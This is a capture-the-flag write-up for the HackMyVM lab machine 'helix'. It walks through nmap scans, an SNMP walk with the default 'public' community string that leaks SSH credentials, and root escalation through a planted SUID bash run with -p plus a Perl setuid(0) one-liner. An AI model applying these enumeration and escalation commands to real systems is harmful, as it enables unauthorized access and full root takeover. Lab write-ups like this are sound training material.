# helix

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| helix | M0rPH3U5 | beginner | hackmyvm |

**Summary:** The helix machine presents a network service challenge where the initial attack surface appears limited to a single SSH port on TCP 22, but a UDP port scan reveals an SNMP service on port 161 using the default community string public. Running snmpwalk against the broker with the default community string retrieves all SNMP MIB values, and the sysContact field contains the string Me:lixeh22 which encodes the username me and a reversed form of the system name as the password. Interpreting the sysContact value yields the SSH credentials me:helix22, which is derived by reversing the hostname helix and appending 22. After establishing an SSH session as the me user, SUID binary enumeration uncovers a rogue hidden bash binary at /var/tmp/.suid_bash owned by root. Executing this binary with the privileged mode flag preserves the effective user ID of 0, and a subsequent Perl one-liner using POSIX setuid and setgid calls converts the effective root context into a full real root shell, allowing retrieval of both the user and root flags.

---

## Reconnaissance

The assessment began with host discovery, TCP port scanning, and a critical UDP port sweep that uncovered the hidden service vector.

1. A ping sweep was performed to identify active hosts on the 192.168.56.0/24 network:

```zsh
~/projects/labs/hmv                                                                                      22:53:59
❯ nmap -sn 192.168.56.0/24                        
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 22:54 +0700
Nmap scan report for 192.168.56.1
Host is up (0.00047s latency).
Nmap scan report for 192.168.56.100
Host is up (0.0012s latency).
Nmap scan report for 192.168.56.142
Host is up (0.0055s latency).
Nmap scan report for 192.168.56.143
Host is up (0.0048s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.22 seconds
```

2. A full TCP port scan was executed against the identified target at 192.168.56.142:

```zsh
~/projects/labs/hmv                                                                                      22:54:24
❯ ip=192.168.56.142

~/projects/labs/hmv                                                                                      22:54:30
❯ nmap -p- -Pn -T4 --min-rate 5000 $ip            
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 22:54 +0700
Nmap scan report for 192.168.56.142
Host is up (0.00032s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 2.69 seconds
```

The TCP scan revealed only a single open port, SSH on port 22.

3. Service version detection and script scanning were performed against the SSH port:

```zsh
~/projects/labs/hmv                                                                                      22:54:38
❯ nmap -p 22 -sCV -Pn -T4 --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 22:55 +0700
Nmap scan report for 192.168.56.142
Host is up (0.00038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results to https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
```

With only SSH exposed on TCP, the assessment pivoted to UDP port scanning to uncover additional services not visible on the TCP attack surface.

4. A UDP top ports scan was performed using root privileges:

```zsh
❯ sudo nmap -sU --top-ports 100 -T4 $ip  
[sudo] password for setyanoegraha:   
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 22:57 +0700  
Nmap scan report for 192.168.56.142  
Host is up (0.00042s latency).  
Not shown: 81 open|filtered udp ports (no-response)  
PORT      STATE  SERVICE  
19/udp    closed chargen  
120/udp   closed cfdptkt  
137/udp   closed netbios-ns  
139/udp   closed netbios-ssn  
161/udp   open   snmp  
427/udp   closed svrloc  
514/udp   closed syslog  
520/udp   closed route  
623/udp   closed asf-rmcp  
997/udp   closed maitrd  
1023/udp  closed unknown  
1028/udp  closed ms-lsa  
1813/udp  closed radacct  
3283/udp  closed netassistant  
9200/udp  closed wap-wsp  
20031/udp closed bakbonenetvault  
32769/udp closed filenet-rpc  
32815/udp closed unknown  
49201/udp closed unknown  
MAC Address: 08:00:27:17:B6:7A (Oracle VirtualBox virtual NIC)  

Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
```

The UDP scan discovered an open SNMP service on port 161, which became the primary attack vector for credential recovery.

5. A full SNMP walk was performed using the default community string public, and the results were filtered for system identification fields:

```zsh
~/projects/labs/hmv                                                                                      23:01:33
❯ snmpwalk -v2c -c public $ip . > snmp_full.txt

   
~/projects/labs/hmv                                                                                                            23:02:43  
❯ grep -i -E "sysContact|sysLocation|sysName" snmp_full.txt  
SNMPv2-MIB::sysContact.0 = STRING: Me:lixeh22  
SNMPv2-MIB::sysName.0 = STRING: helix  
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay  
NET-SNMP-AGENT-MIB::nsModuleName."".8.1.3.6.1.2.1.1.4.127 = STRING: mibII/sysContact  
NET-SNMP-AGENT-MIB::nsModuleName."".8.1.3.6.1.2.1.1.5.127 = STRING: mibII/sysName  
NET-SNMP-AGENT-MIB::nsModuleName."".8.1.3.6.1.2.1.1.6.127 = STRING: mibII/sysLocation
```

The sysContact field contained the string `Me:lixeh22`. Combined with the sysName value `helix`, this was interpreted as a username `me` and a password derived from reversing the hostname `helix` and appending `22`, yielding the password `helix22`. The SNMP service was accessible with the default community string `public`, requiring no authentication.

---

## Initial Access

### SSH Authentication with SNMP Recovered Credentials

6. Using the interpreted credentials, an SSH session was established:

```zsh
~/projects/labs/hmv                                                                                  10s 23:03:41
❯ ssh me@$ip     
me@192.168.56.142's password: 
Linux helix 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 12 17:06:19 2026 from 192.168.56.1
me@helix:~$ id
uid=1001(me) gid=1001(me) groupes=1001(me)
me@helix:~$ 
```

Access was gained as the me user (UID 1001) on a Debian GNU/Linux system named helix. The credentials `me:helix22` were confirmed valid.

---

## Privilege Escalation

### SUID Binary Exploitation and Perl Shell Upgrade

7. SUID binary enumeration was performed to identify potential privilege escalation vectors:

```bash
me@helix:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 494144  5 avril 01:29 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 18744 17 janv.  2025 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 51272  8 mars   2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 18816 10 mai    2025 /usr/bin/newgrp
-rwsr-xr-x 1 root root 55688 10 mai    2025 /usr/bin/umount
-rwsr-xr-x 1 root root 118168 19 avril 2025 /usr/bin/passwd
-rwsr-xr-x 1 root root 88568 19 avril 2025 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 72072 10 mai    2025 /usr/bin/mount
-rwsr-xr-x 1 root root 70888 19 avril 2025 /usr/bin/chfn
-rwsr-xr-x 1 root root 306456 11 févr.  2026 /usr/bin/sudo
-rwsr-xr-x 1 root root 52936 19 avril 2025 /usr/bin/chsh
-rwsr-xr-x 1 root root 84360 10 mai    2025 /usr/bin/su
-rwsr-xr-x 1 root root 1298416 30 avril 22:00 /var/tmp/.suid_bash
```

A nonstandard SUID binary was identified at `/var/tmp/.suid_bash`, a hidden bash binary owned by root with the SUID bit set. This binary does not belong to the standard Debian system installation and represents an intentional privilege escalation vector.

8. The SUID bash binary was executed with the privileged mode flag, followed by a Perl POSIX setuid one-liner to obtain a full real root shell:

```bash
me@helix:~$ /var/tmp/.suid_bash -p
.suid_bash-5.2# which perl python3
/usr/bin/perl
.suid_bash-5.2# perl -e 'use POSIX qw(setuid setgid); $ENV{PATH}="/usr/bin:/bin"; POSIX::setgid(0); POSIX::setuid(0); exec "/bin/bash";'
root@helix:~# su -
root@helix:~# id;whoami;hostname
uid=0(root) gid=0(root) groupes=0(root)
root
helix
root@helix:~# cat /home/me/user.txt /root/root.txt 
410...
3fa...
```

The SUID bash binary with the `-p` flag maintained the effective user ID as 0 (root). The Perl one-liner called `POSIX::setgid(0)` and `POSIX::setuid(0)` before executing `/bin/bash`, converting the effective root context into a full real UID root shell. A subsequent `su -` established a clean login shell, and both the user flag from `/home/me/user.txt` and the root flag from `/root/root.txt` were retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: Nmap TCP scanning identified only SSH on port 22, but a UDP top ports scan revealed an open SNMP service on port 161 accessible with the default community string public.
2. **Vulnerability Discovery**: A full snmpwalk with the default community string retrieved all MIB values, and the sysContact field contained the encoded credential string Me:lixeh22, which combined with the sysName value helix yielded the SSH credentials me:helix22.
3. **Exploitation**: The recovered credentials were used to establish an SSH session as the me user, gaining initial foothold on the Debian Linux system.
4. **Internal Enumeration**: SUID binary enumeration revealed a rogue hidden bash binary at /var/tmp/.suid_bash owned by root with the SUID bit set, not part of the standard system installation.
5. **Privilege Escalation**: Executing /var/tmp/.suid_bash with the privileged mode flag preserved the effective user ID as 0, and a Perl POSIX setuid one-liner converted the effective root context into a full real root shell, allowing retrieval of both the user and root flags.
